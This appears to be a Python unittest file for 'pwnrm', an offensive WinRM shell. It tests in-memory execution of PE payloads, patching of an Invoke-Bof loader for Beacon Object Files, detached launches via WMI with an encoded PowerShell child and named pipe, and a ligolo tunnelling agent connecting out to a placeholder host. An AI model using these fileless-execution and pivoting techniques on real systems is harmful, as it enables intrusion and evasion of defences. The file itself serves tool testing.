"""Tests for managed/native in-memory execution preparation."""

import base64
import re
import struct
import unittest
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

from pwnrm.core.noconsolation import (
    NoConsolationOptions,
    PEInfo,
    inspect_pe,
    pack_noconsolation_arguments,
    patch_invoke_bof,
)
from pwnrm.shell.pwnshell import PwnShell
from pwnrm.shell.commands import split_args


def fake_pe(*, machine=0x8664, managed=False):
    data = bytearray(0x220)
    data[:2] = b"MZ"
    struct.pack_into("<I", data, 0x3C, 0x80)
    data[0x80:0x84] = b"PE\0\0"
    struct.pack_into("<H", data, 0x84, machine)
    optional = 0x80 + 24
    magic = 0x20B if machine == 0x8664 else 0x10B
    struct.pack_into("<H", data, optional, magic)
    directory = optional + (112 if magic == 0x20B else 96)
    if managed:
        struct.pack_into("<II", data, directory + (14 * 8), 0x2000, 72)
    return bytes(data)


def unpack_frames(data):
    values = []
    offset = 0
    while offset < len(data):
        length = struct.unpack_from("<I", data, offset)[0]
        offset += 4
        values.append(data[offset:offset + length])
        offset += length
    return values


class TestNoConsolationCore(unittest.TestCase):
    def test_pe_inspection_detects_native_and_managed_images(self):
        self.assertEqual(inspect_pe(fake_pe()), PEInfo("x64", False))
        self.assertEqual(inspect_pe(fake_pe(machine=0x14C, managed=True)), PEInfo("x86", True))
        with self.assertRaisesRegex(RuntimeError, "not a PE"):
            inspect_pe(b"not a PE")

    def test_native_argument_buffer_has_expected_28_fields(self):
        packed = pack_noconsolation_arguments(
            source="agent.exe",
            payload=fake_pe(),
            remote_source=False,
            argv=["-connect", "127.0.0.1:11601"],
            options=NoConsolationOptions(timeout=0, no_output=True),
        )
        fields = unpack_frames(packed)
        self.assertEqual(len(fields), 28)
        self.assertEqual(fields[1], b"agent.exe\0")
        self.assertEqual(fields[3], fake_pe())
        self.assertEqual(struct.unpack("<I", fields[6])[0], 0)
        self.assertEqual(struct.unpack("<I", fields[12])[0], 1)
        self.assertIn(b"127.0.0.1:11601", fields[9])

    def test_remote_native_argument_buffer_uses_target_path_without_payload(self):
        fields = unpack_frames(pack_noconsolation_arguments(
            source=r"C:\Windows\System32\whoami.exe",
            payload=b"",
            remote_source=True,
            argv=["/all"],
            options=NoConsolationOptions(),
        ))
        self.assertEqual(fields[3], b"")
        self.assertEqual(struct.unpack("<I", fields[5])[0], 1)
        self.assertEqual(fields[4], b"C:\\Windows\\System32\\whoami.exe\0")

    def test_loader_patch_adds_packed_args_and_beacon_value_callbacks(self):
        source = """function Invoke-Bof {
        [Parameter(Mandatory = $false)]
        [Switch]
        $UnicodeStringParameter
        class BeaconAPI {
            ############################
            #      Data Parser API     #
        $BeaconDataParseDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [IntPtr], [int]) ([void])), [BeaconAPI].GetMethod("BeaconDataParse"))
        if ($Symbol -eq "__imp_BeaconDataParse")
    if ($ArgumentList -ne $null)
    {
        $ArgumentsBytes, $ArgumentsBytesLength = Load-BeaconParameters -ArgumentList $ArgumentList -UnicodeStringParameter $UnicodeStringParameter
    }
"""
        patched = patch_invoke_bof(source)
        self.assertIn("function Invoke-PwnRMBof", patched)
        self.assertIn("$PackedArguments", patched)
        self.assertIn("BeaconAddValue", patched)
        self.assertIn("__imp_BeaconGetValue", patched)
        self.assertIn("__imp_LoadLibraryA", patched)
        self.assertIn("__imp_GetProcAddress", patched)
        self.assertIn("class PwnRMBeaconAPI", patched)


class TestNoConsolationShell(unittest.TestCase):
    @staticmethod
    def shell():
        shell = object.__new__(PwnShell)
        shell.last_run_errors = []
        shell.write_warning = MagicMock()
        shell.write_error = MagicMock()
        shell._run_managed_memory = MagicMock(return_value={"status": "completed"})
        shell._run_native_memory = MagicMock(return_value={"status": "completed"})
        shell.run_sync = MagicMock(return_value="8\n")
        return shell

    def test_stateless_backend_rejects_process_scoped_memory_execution(self):
        shell = self.shell()
        shell.runspace = SimpleNamespace(persistent=False)
        result = shell.noconsolation("agent.exe")
        self.assertEqual(result["status"], "error")
        self.assertIn("persistent WinRM", result["error"])
        shell._run_native_memory.assert_not_called()

    def test_managed_payload_runs_in_background_without_capture_flag(self):
        shell = self.shell()
        with (
            patch("pwnrm.shell.pwnshell.load_operator_payload", return_value=fake_pe(managed=True)),
            patch("pwnrm.shell.pwnshell.inspect_pe", return_value=PEInfo("x64", True)),
        ):
            result = shell.noconsolation("Rubeus.exe triage")
        self.assertEqual(result["status"], "completed")
        shell._run_managed_memory.assert_called_once()
        self.assertFalse(shell._run_managed_memory.call_args.args[2])

    def test_native_capture_is_explicit_and_enables_output(self):
        shell = self.shell()
        with (
            patch("pwnrm.shell.pwnshell.load_operator_payload", return_value=fake_pe()),
            patch("pwnrm.shell.pwnshell.inspect_pe", return_value=PEInfo("x64", False)),
        ):
            result = shell.noconsolation("--capture-output agent.exe --help")
        self.assertEqual(result["status"], "completed")
        call = shell._run_native_memory.call_args
        self.assertTrue(call.kwargs["capture_output"])
        self.assertFalse(call.kwargs["options"].no_output)
        self.assertEqual(call.kwargs["options"].timeout, 60)

    def test_native_default_is_no_output_background_with_no_timeout(self):
        shell = self.shell()
        with (
            patch("pwnrm.shell.pwnshell.load_operator_payload", return_value=fake_pe()),
            patch("pwnrm.shell.pwnshell.inspect_pe", return_value=PEInfo("x64", False)),
        ):
            shell.noconsolation("agent.exe -connect 127.0.0.1:11601")
        call = shell._run_native_memory.call_args
        self.assertFalse(call.kwargs["capture_output"])
        self.assertTrue(call.kwargs["options"].no_output)
        self.assertEqual(call.kwargs["options"].timeout, 0)

    def test_detached_native_is_explicit_and_cannot_capture(self):
        shell = self.shell()
        with (
            patch("pwnrm.shell.pwnshell.load_operator_payload", return_value=fake_pe()),
            patch("pwnrm.shell.pwnshell.inspect_pe", return_value=PEInfo("x64", False)),
        ):
            result = shell.noconsolation("--detached agent.exe -connect 127.0.0.1:11601")
        self.assertEqual(result["status"], "completed")
        self.assertTrue(shell._run_native_memory.call_args.kwargs["detached"])

        rejected = shell.noconsolation("--detached --capture-output agent.exe")
        self.assertEqual(rejected["status"], "error")
        self.assertIn("cannot be combined", rejected["error"])

    def test_detached_runner_uses_wmi_and_an_in_memory_named_pipe(self):
        shell = object.__new__(PwnShell)
        shell._stage_runspace_bytes = MagicMock(side_effect=["Stage0", "Stage1"])
        shell.run_with_interrupt = MagicMock(return_value=False)
        shell.write_line = MagicMock()
        result = shell._run_detached_memory(
            blobs=[b"payload", b"arguments"],
            kind="managed",
            architecture="x64",
            setup="    $Loaded = $true\n",
            execute="    [void]$Loaded\n",
        )
        self.assertTrue(result["detached"])
        script = shell.run_with_interrupt.call_args.args[0]
        self.assertIn("NamedPipeServerStream", script)
        self.assertIn("Invoke-CimMethod -ClassName Win32_Process", script)
        self.assertIn("PwnRM detached managed memory job started", script)
        encoded = re.search(r"-EncodedCommand ([A-Za-z0-9+/=]+)'", script).group(1)
        child = base64.b64decode(encoded).decode("utf-16le")
        self.assertIn("NamedPipeClientStream", child)
        self.assertIn("Read-PwnRMBlob", child)
        self.assertIn("$Pipe.WriteByte(165)", child)

    def test_ligolo_alias_forces_detached_native_execution(self):
        shell = object.__new__(PwnShell)
        shell.write_warning = MagicMock()
        shell.noconsolation = MagicMock(return_value={"status": "completed"})
        result = shell.ligolo(r'--remote "C:\Program Files\agent.exe" -connect 192.0.2.10:11601 -ignore-cert')
        self.assertEqual(result["status"], "completed")
        forwarded = split_args(shell.noconsolation.call_args.args[0])
        self.assertEqual(forwarded[:4], ["--detached", "native", "--remote", r"C:\Program Files\agent.exe"])
        self.assertEqual(forwarded[4:], ["-connect", "192.0.2.10:11601", "-ignore-cert"])

    def test_remote_payload_requires_explicit_mode(self):
        shell = self.shell()
        result = shell.noconsolation(r"--remote C:\Windows\System32\whoami.exe")
        self.assertEqual(result["status"], "error")
        shell._run_native_memory.assert_not_called()


if __name__ == "__main__":
    unittest.main()
